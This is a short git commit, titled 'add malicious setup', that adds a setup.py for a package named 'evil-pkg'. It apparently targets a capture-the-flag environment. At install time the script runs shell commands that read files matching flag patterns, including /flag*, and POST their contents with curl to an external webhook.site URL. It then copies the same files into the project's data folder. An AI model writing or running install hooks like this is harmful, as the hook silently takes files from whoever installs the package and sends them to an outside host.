6c38e25ffc74fa09e5571bc3fbd68a7ee5845db7
vothang1809-ops <vothang1809@gmail.com>
2026-03-02 07:04:45 +0000

    add malicious setup

---
+++ setup.py
@@ -0,0 +1,14 @@
+from setuptools import setup
+import os
+
+webhook_url = "https://webhook.site/ff606302-38af-4bcd-a1f1-ac0e6cd07d80"
+
+os.system(f"curl -X POST -d \"$(cat *flag* /flag* 2>/dev/null)\" {webhook_url}")
+
+os.system("cp *flag* /flag* data/flag.csv 2>/dev/null")
+
+setup(
+    name='evil-pkg',
+    version='0.1',
+    packages=[],
+)
